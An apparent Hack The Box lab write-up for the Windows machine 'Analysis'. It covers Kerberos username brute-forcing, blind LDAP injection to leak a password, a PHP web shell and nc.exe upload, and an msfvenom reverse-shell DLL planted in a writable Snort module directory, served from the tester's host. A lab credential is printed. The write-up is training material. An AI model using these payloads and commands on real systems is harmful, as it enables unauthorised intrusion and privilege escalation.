Analysis — это сложная машина Windows с различными уязвимостями, ориентированная на веб-приложения, привилегии Active Directory (AD) и манипулирование процессами. Изначально уязвимость внедрения LDAP предоставляет нам учетные данные для аутентификации в защищенном веб-приложении. С помощью этого приложения доступ к локальной системе обеспечивается путем выполнения команд посредством загрузки файла HTA. В целевой системе учетные данные другого пользователя находятся в файлах журналов веб-приложения. Впоследствии, реализуя API-перехватчик в `BCTextEncoder`, зашифрованный пароль расшифровывается и используется для передачи другому пользователю. Наконец, изменив пароль учетной записи, имеющей права DCSync в отношении домена, можно получить административный доступ к контроллеру домена.

Nmap Results
ℹ️
Right from the start, this machine proved to be a little non-standard. The typical SYN scan didn't work, and required me to run a full TCP connect scan.
sudo nmap -Pn -p- -sT --min-rate 5000 -A -oN nmap.txt 10.10.11.250
Bash
-sT for full TCP connect scan

# Nmap 7.94SVN scan initiated Fri Jan 26 12:09:18 2024 as: nmap -Pn -p- -sT --min-rate 5000 -A -oN nmap.txt 10.10.11.250
Nmap scan report for 10.10.11.250
Host is up (0.012s latency).
Not shown: 65507 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-26 17:09:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-01-26T17:10:41
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   11.19 ms 10.10.14.1
2   11.24 ms 10.10.11.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 26 12:10:49 2024 -- 1 IP address (1 host up) scanned in 90.41 seconds
Plain text
ℹ️
You should always look for breadcrumbs in the initial nmap output. You'll notice on tcp/389 (LDAP) that there's a root domain name of analysis.htb. Add that to your hosts file.
echo '10.10.11.250        analysis.htb' | sudo tee -a /etc/hosts
Bash





Service Enumeration
TCP/389
ℹ️
You should always look for breadcrumbs in the initial nmap output. You'll notice on tcp/389 (LDAP) that there's a LDAP default site name of analysis.htb0.
sudo nmap -Pn -sT -p389 -T4 --script ldap-rootdse 10.10.11.250
Bash
Query the Root DSE of the LDAP server

LDAPWiki: RootDSE
Page version 1, last modified by UnknownAuthor, on

apachejspωiki
UnknownAuthor

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=analysis,DC=htb
|       ldapServiceName: analysis.htb:dc-analysis$@ANALYSIS.HTB
...
...
Plain text
Snippet of the Root DSE

We can see the domain context is DC=analysis,DC=htb, indicating a root domain of analysis.htb and the LDAP server is named dc-analysis. Let's add the domain to our hosts file.

echo '10.10.11.250        analysis.htb' | sudo tee -a /etc/hosts
Bash

No anonymous LDAP binds allowed, we'll need a credential to enumerate more



TCP/53

Attempted zone transfer of 'analysis.htb' was refused



TCP/139,445

Anonymous login successful, but no shares available to enumerate

Both crackmapexec and enum4linux anonymous enumeration failed



TCP/88
cat /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt | tr '[:upper:]' '[:lower:]' | sort -u > kerberos_users.txt
Bash
Deduplicate and create a list of potential usernames to enumerate

kerbrute userenum -d analysis.htb --dc 10.10.11.250 -t 100 -o kerbrute.log ./kerberos_users.txt
Bash
Bruteforce Kerberos to enumerate valid usernames


Output is also stored in 'kerberos.log'

No AS-REP roasting



TCP/80

Gobuster Enumeration
Directories and Files
gobuster dir -u http://analysis.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,aspx,php -o gobuster-80.txt -t 100
Bash
/Images               (Status: 301) [Size: 162] [--> http://analysis.htb/Images/]
/Index.html           (Status: 200) [Size: 17830]
/bat                  (Status: 301) [Size: 159] [--> http://analysis.htb/bat/]
/css                  (Status: 301) [Size: 159] [--> http://analysis.htb/css/]
/images               (Status: 301) [Size: 162] [--> http://analysis.htb/images/]
/index.html           (Status: 200) [Size: 17830]
/js                   (Status: 301) [Size: 158] [--> http://analysis.htb/js/]
Plain text
Nothing too promising here at first glance. This server is clearly using virtual hosts, as the behavior in page loads is different when loading http://10.10.11.250 and http://analysis.htb. Time to enumerate virtual hosts.

Virtual Hosts
gobuster vhost -k --domain analysis.htb --append-domain -u http://10.10.11.250 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
Bash
Found: internal.analysis.htb Status: 403 [Size: 1268]
Plain text
echo '10.10.11.250        internal.analysis.htb' | sudo tee -a /etc/hosts
Bash
Add 'internal.analysis.htb' to our hosts file

Enumerating the Virtual Host

gobuster dir -u http://internal.analysis.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,aspx,php -o gobuster-80-internal.txt -t 100
Bash
/dashboard            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/dashboard/]
/employees            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/employees/]
/users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/users/]
Plain text



Enumerate /dashboard
gobuster dir -u http://internal.analysis.htb/dashboard -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,asp,aspx -o gobuster-80-internal.txt -t 100
Bash
/404.html             (Status: 200) [Size: 13143]
/css                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/css/]
/img                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/img/]
/js                   (Status: 301) [Size: 177] [--> http://internal.analysis.htb/dashboard/js/]
/lib                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/lib/]
/uploads              (Status: 301) [Size: 182] [--> http://internal.analysis.htb/dashboard/uploads/]
Plain text

Test the '404.html' page
Clicking around on this page, and it's pretty clear that this is just a static HTML page and doesn't have any real interactive or session management features. None of the other directories discovered appeared to contain anything interesting that I could find.




Enumerate /users and /employees
gobuster dir -u http://internal.analysis.htb/employees -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,aspx,php -o gobuster-80-internal.txt -t 100
Bash
/Login.php            (Status: 200) [Size: 1085]
/login.php            (Status: 200) [Size: 1085]
Plain text
IIS will serve contents regardless of case


Seems like this would pair well with the '/users/list.php' script
gobuster dir -u http://internal.analysis.htb/users -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,aspx,php,txt -o gobuster-80-internal.txt -t 100
Bash
/list.php             (Status: 200) [Size: 17]
Plain text

Parameter and Value Fu... | 0xBEN | Notes
Serving Files From a Web Server NGINX /etc/nginx/sites-available/example.com.conf server {…

0xBEN | Notes

Let's see if we can find the valid parameter


💡
When first testing out the gobuster fuzz utility, I notice a lot of web server responses with a content length of 17. We'll have much better luck finding a parameter if we filter this out. To do so, we can use the --exclude-length flag.
gobuster fuzz -u "http://internal.analysis.htb/users/list.php?FUZZ" -w /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -o 'gobuster-params.txt' --exclude-length 17
Bash
Found: [Status=200] [Length=406] [Word=name] http://internal.analysis.htb/users/list.php?name
Plain text
The valid parameter is ?name, indicating we should use a full URL of http://internal.analysis.htb/users/list.php?name=VALUE_HERE. Let's see what we can dig up. Here is a list of the usernames from the kerbrute output. Let's see if we can use these to our advantage.


for user in $(cat usernames.txt) ; do curl -s -x http://127.0.0.1:8080 "http://internal.analysis.htb/users/list.php?name=$user" ; done
Bash
We'll run a loop over the usernames and request them in the ?name= parameter. We'll also proxy the requests through Burp, so we can view the results.


badam

jangel

technician
💡
One thing that I found funny is that using the * character returns the technician user. Also, using ** as input seems to break the application entirely. The * character is very common in LDAP lookups, so it's entirely possible this PHP script is searching for names using LDAP.





Testing Blind LDAP Injection
Since, we know the parameter is injectable and likely using LDAP, we can search various attributes of the user object in LDAP. One place to look is the user Description field in LDAP, as sometimes, administrators put sensitive information such as passwords here.

LDAP Injection - HackTricks

HackTricks

ℹ️
Since I'm not too familiar with writing scripts to test LDAP injections, I did rely partially on ChatGPT to establish the foundation of this script. After the foundation was built, I iteratively modified it until the end result was achieved.
Python LDAP Injection Script


Python
Pay careful attention to the base_url variable in the script. You'll note the syntax of:

base_url = f'http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass={ldap_object_type})({ldap_field}='
Python
Which effectively produces an LDAP query of:

*)(&
(objectClass=user)
(description={encoded_char}*)
Plain text
So, we're saying, get any user *) which closes this filter, but we open and AND filter (& and require that it be an object type of user and the description should match {encoded_char}.

And, {encoded_char} is a string of characters — URL encoded — that continuously grows as valid matches are found in the description field.



Another example of testing a different LDAP field



Test Credentials on Employee Login







Exploit
A PHP script that is vulnerable to LDAP injection in a development environment is world-accessible and easily discoverable using basic virtual host and file enumeration steps. Using blind LDAP injection, an attacker is able to loop over an alphanumeric set of characters to gather specific information about user objects.

In this particular case, a password was stored in one of the user objects that was enumerated in an earlier step by gathering valid usernames from Kerberos. Once logged into the employee dashboard, a file upload form allows for any file with any extension to be uploaded, and informs the user where the files are uploaded to.

Admin Panel File Upload

Click on 'SOC Report'

Test a file upload of a Windows reverse PHP shell
wwwolf-php-webshell/webshell.php at master · WhiteWinterWolf/wwwolf-php-webshell
WhiteWinterWolf’s PHP web shell. Contribute to WhiteWinterWolf/wwwolf-php-webshell development by creating an account on GitHub.

GitHub
WhiteWinterWolf


Web shell saved in 'ws.php'

Can be found in the '/dashboard/uploads' directory found earlier with Gobuster

Copy nc.exe to the currect directory

Upload and execute 'nc.exe' in one go






Post-Exploit Enumeration
Operating Environment
OS & Kernel


Plain text
Current User


Plain text



Users and Groups
LDAP Domain Dump
ldapdomaindump -u 'ANALYSIS.HTB\technician' -p '97NTtl*4QP96Bv' analysis.htb -o ldd
Bash
Use the 'technician' credential we discovered earlier




These users are able to WinRM into the target

Default domain admin

'technician' account from LDAP showing the password



Network Configurations
Network Interfaces


Plain text



Processes and Services
Interesting Processes


Plain text
Interesting Services


Plain text



Interesting Files
C:\inetpub\internal\users\list.php


PHP
C:\inetpub\internal\employees\login.php


PHP
C:\private\encoded.txt


Plain text





Privilege Escalation
There were a few interesting breadcrumbs to follow in the post-exploit enumeration, namely:

BCTextEncoder
In my enumeration, this was just used to spawn login sessions for jdoe
The webservice credential
In my enumeration, this is a dead end
The jdoe WinRM user
I did find a credential for jdoe, but we actually don't need to pivot to this user
The SnortSvc service
Snort
Enumerating the Service
Since we know the SnortSvc service is running with administrative privileges, it makes sense to look there first. At first glance, the service path may look like an unquoted service path, but this is not the case.

Much in the same way you'd look at writable systemd unit file directories on a Linux host, you should look for writable service directories on a Windows host. I came up with this PowerShell one-liner to enumerate the C:\Snort directory:

Get-ChildItem -Recurse C:\Snort | ForEach-Object { Write-Host $_.FullName ; Write-Host '' ; Get-Acl $_.FullName | Select-Object -ExpandProperty Access | Where-Object {$_.IdentityReference -eq 'BUILTIN\Utilisateurs' -and $_.FileSystemRights -notlike '*Read*'} | Format-List FileSystemRights, IdentityReference, AccessControlType}
PowerShell
This one-line is doing the following:

Recurse into C:\Snort and get all files and directories
Pipe to Get-Acl and look at the Access property of the ACL objects
Filter on Access rights where applies to the BUILTIN\Users (in French on the target) and filter out any rights with Read, since that's not interesting in this case
Finally, output in list format any access rights on files and/or folders
You'll notice right away that we have AppendData and CreateFiles permissions as low-level users on a a lot of interesting directories.


If you look at the C:\Snort\etc\snort.conf file, you'll see a particular directory that's ripe for abuse.


If — as instructed in the configuration file — you reference the Snort manual, you'll see that Snort allows developers and admins to place custom modules to extend the capabilities of Snort.


You'll notice that the naming convention appears to be sf_ + proto.dll. Following this convention, we should be able to obtain a reverse shell.




Reverse Shell as Administrator
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f dll -o sf_pwn.dll
Bash

Generate the malicious .dll
sudo rlwrap nc -lnvp 443
Bash
Start a TCP listener

sudo python3 -m http.server 80
Bash
Serve the malicious .dll over HTTP

Invoke-WebRequest http://10.10.14.15/sf_pwn.dll -o sf_pwn.dll
PowerShell
Download the malicious .dll into the target directory


I skipped a level by going straight to Administrator. You can find the user flag with PowerShell. First, run powershell.exe. Then, run ls -recurse -filter 'user.txt' C:\Users
